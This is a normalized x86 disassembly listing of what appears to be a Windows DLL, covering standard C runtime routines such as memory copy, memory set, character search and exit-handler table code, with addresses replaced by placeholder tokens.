call sub_10078970
add esp 0xc
mov [ ebp - 0x8 ] 0x0
cmp edi 0xb
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] 0xfffd
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10030b10
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10078bf0
push esi
push edi
xor edi edi
xor eax eax
jmp r-xdata
mov ecx [ eax + r--data ]
lea esi [ eax + r--data ]
mov eax [ esi + 0x4 ]
push 0x1
push eax
push ecx
push ebx
call sub_1002a720
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn
inc edi
mov eax edi
shl eax 0x4
cmp [ eax + r--data ] 0xffffffff
jne r-xdata
pop edi
xor eax eax
pop esi
retn
sub_10078c40
push ebp
mov ebp esp
push ecx
push esi
push ebx
call sub_1004ac70
mov esi eax
mov [ ebp - 0x4 ] esi
cmp eax 0x41
jl r-xdata
cmp eax 0x7a
jle r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
cmp eax 0x5a
jle r-xdata
push ebx
call sub_10032470
jmp r-xdata
cmp eax 0x3b
jne r-xdata
push ebx
call sub_1003c6e0
add esp 0x8
cmp eax 0x61
jl r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_1004ac70
mov edx [ ebp + 0x8 ]
mov edi eax
push edx
sub edi esi
call sub_10016600
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10030b10
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ esi ] 0x7
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edi
sub_10078cd0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov ebx edi
call sub_10078bf0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10078c40
push edi
mov esi eax
call sub_10004030
add esp 0x8
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
cmp [ eax + ecx - 0x1 ] 0x3b
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] ecx
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_10016600
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push edi
call sub_1003c6e0
add esp 0x4
cmp eax 0x3d
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] edx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push edi
call sub_10030b10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ ebx ] 0x6
mov [ ebx + 0x18 ] edx
mov [ ebx + 0x1c ] eax
push edi
call sub_10004030
add esp 0x4
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10027da1
add esp 0x4
test eax eax
je r-xdata
sub_10078db0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10078e34 ]
jmp [ ecx * 4 + jump_table_10078eb4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078f20 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_100790bc ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10078fc0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100790bc ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10078f20 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100790bc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078f20 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078f20 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078f20 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100790bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100790bc ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100790bc ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10079111
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_10017a88
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1005ebf2
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1005ebf2
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10079208
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10051dfe
call sub_1002568a
push eax
call sub_1002c5c4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_10002a14
mov esi [ ebp + 0x8 ]
push esi
call sub_1002568a
push eax
call sub_1005d232
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call sub_100791c7
sub_1007926d
push 0x20
push r--data
call sub_10079bf0
push 0x8
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10079398
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10079c35
retn
mov [ rw-data ] 0x1
push 0x8
call sub_100106d4
pop ecx
push [ ebp + 0x8 ]
call sub_100379d0
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_10029ea7
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_10029ea7
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_100793c0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_10079480
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1007952d
push 0xc
push r--data
call sub_10079bf0
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10062d10
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_100393ec
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_100393ec
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10062d10
push edi
push 0x0
push ebx
call sub_100393ec
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10079c35
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
sub_10079623
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
leave
retn
push esi
call sub_10079b60
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_100796a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10079724 ]
jmp [ ecx * 4 + jump_table_100797a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10079810 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_100799ac ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_100798b0 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100799ac ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10079810 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_100799ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10079810 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10079810 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10079810 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100799ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100799ac ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_100799ac ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10079a10
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10069e67
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_10079a8a
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
